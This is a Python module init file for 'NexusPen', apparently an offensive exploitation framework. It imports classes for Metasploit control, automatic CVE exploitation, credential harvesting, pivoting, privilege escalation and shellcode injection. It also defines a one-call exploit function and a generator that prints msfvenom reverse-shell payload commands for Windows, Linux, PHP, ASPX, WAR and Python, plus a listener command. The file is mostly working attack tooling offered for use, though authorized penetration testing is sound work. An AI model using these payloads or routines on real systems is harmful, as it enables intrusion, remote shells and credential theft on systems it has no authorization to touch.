"""
NexusPen - Exploit Module
=========================
Complete exploitation framework.

Includes:
- metasploit: Metasploit Framework integration
- auto_exploit: Automatic CVE-to-exploit mapping
- post_exploit: Post-exploitation techniques
- privesc: Privilege escalation (Windows/Linux)
- shellcode: Shellcode generation and encoding
"""

# Metasploit integration
from .metasploit import (
    MetasploitClient,
    ExploitRunner,
    ExploitResult,
)

# Auto exploitation
from .auto_exploit import (
    AutoExploiter,
    ManualExploiter,
    ExploitDB,
    SmartAutoExploiter,
    ExploitResult as AutoExploitResult,
)

# Post exploitation
from .post_exploit import (
    WindowsPostExploit,
    LinuxPostExploit,
    CredentialHarvester,
    PivotingTools,
    PostExploitResult,
)

# Privilege escalation
from .privesc import (
    WindowsPrivEsc,
    LinuxPrivEsc,
    PrivEscSuggester,
    PrivEscVector,
)

# Shellcode
from .shellcode import (
    ShellcodeGenerator,
    ShellcodeEncoder,
    ShellcodeInjector,
    Shellcode,
)

__all__ = [
    # Metasploit
    'MetasploitClient', 'ExploitRunner', 'ExploitResult',
    
    # Auto exploit
    'AutoExploiter', 'ManualExploiter', 'ExploitDB', 'SmartAutoExploiter',
    
    # Post exploit
    'WindowsPostExploit', 'LinuxPostExploit', 'CredentialHarvester',
    'PivotingTools', 'PostExploitResult',
    
    # Privilege escalation
    'WindowsPrivEsc', 'LinuxPrivEsc', 'PrivEscSuggester', 'PrivEscVector',
    
    # Shellcode
    'ShellcodeGenerator', 'ShellcodeEncoder', 'ShellcodeInjector', 'Shellcode',
]


# Quick exploit function
def quick_exploit(target: str, cve: str, lhost: str, lport: int):
    """
    Quick exploit a target using a specific CVE.
    
    Args:
        target: Target IP/hostname
        cve: CVE identifier (e.g., CVE-2021-44228)
        lhost: Your IP for reverse connection
        lport: Your port for reverse connection
    """
    from rich.console import Console
    console = Console()
    
    console.print(f"\n[bold red]üéØ QUICK EXPLOIT: {cve} -> {target}[/bold red]")
    
    exploiter = AutoExploiter(target, lhost, lport)
    return exploiter.exploit_cve(cve)


# Generate all payloads for a target
def generate_payloads(lhost: str, lport: int):
    """Generate all reverse shell payloads."""
    from rich.console import Console
    console = Console()
    
    console.print(f"\n[bold cyan]‚ïê‚ïê‚ïê PAYLOAD GENERATION ‚ïê‚ïê‚ïê[/bold cyan]")
    console.print(f"[cyan]LHOST: {lhost} | LPORT: {lport}[/cyan]")
    
    # Generate msfvenom commands
    console.print("\n[yellow]‚îÅ‚îÅ‚îÅ MSFVenom Commands ‚îÅ‚îÅ‚îÅ[/yellow]")
    
    payloads = [
        ("Windows EXE", f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe"),
        ("Windows DLL", f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll > shell.dll"),
        ("Linux ELF", f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf"),
        ("PHP", f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php"),
        ("ASPX", f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx > shell.aspx"),
        ("WAR", f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war"),
        ("Python", f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw"),
    ]
    
    for name, cmd in payloads:
        console.print(f"\n[green]{name}:[/green]")
        console.print(f"[dim]{cmd}[/dim]")
    
    # Handler command
    console.print("\n[yellow]‚îÅ‚îÅ‚îÅ Metasploit Handler ‚îÅ‚îÅ‚îÅ[/yellow]")
    console.print(f'''[dim]msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j"[/dim]''')
